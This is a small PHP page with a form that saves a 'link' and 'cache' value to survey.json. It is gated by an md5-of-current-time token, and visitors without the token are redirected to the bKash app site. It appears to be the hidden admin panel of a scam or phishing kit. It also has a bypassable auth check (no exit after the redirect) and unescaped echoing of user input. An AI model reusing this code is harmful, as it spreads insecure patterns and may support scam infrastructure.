<html>
    <head>
            <link rel="stylesheet" href="assets/bootstrap.min.css">
    </head>
<body>
    
    <div class="container">

<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
  <div class="form-group">
      <br><br>
  <input type="text" name="link" class="form-control">
      <br>
  <input type="text" name="cache" class="form-control">
      <br>
  <input type="submit"  class="btn btn-default">
    </div>
</form>
    </div>
<?php
    $p = $_GET['p'];
    $t= date("hi"). date("m.d");
    if($p != md5($t)) {
        header('Location: https://www.bkash.com/app/');
    }
    
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $link = $_POST['link'];
  $cache = $_POST['cache'];
  if ( empty($link)|| empty($cache) ) {
    echo "<p style='text-align:center'>Can't be empty</p>";
  } else {
    echo "<p style='text-align:center'>$link</p>";
    $contents = file_get_contents('survey.json');
    $contentsDecoded = json_decode($contents, true);
    $contentsDecoded['link']= $link;
    $contentsDecoded['cache']= $cache;
    $json = json_encode($contentsDecoded);
     file_put_contents('survey.json', $json);
      
  }
}
?>

</body>
</html>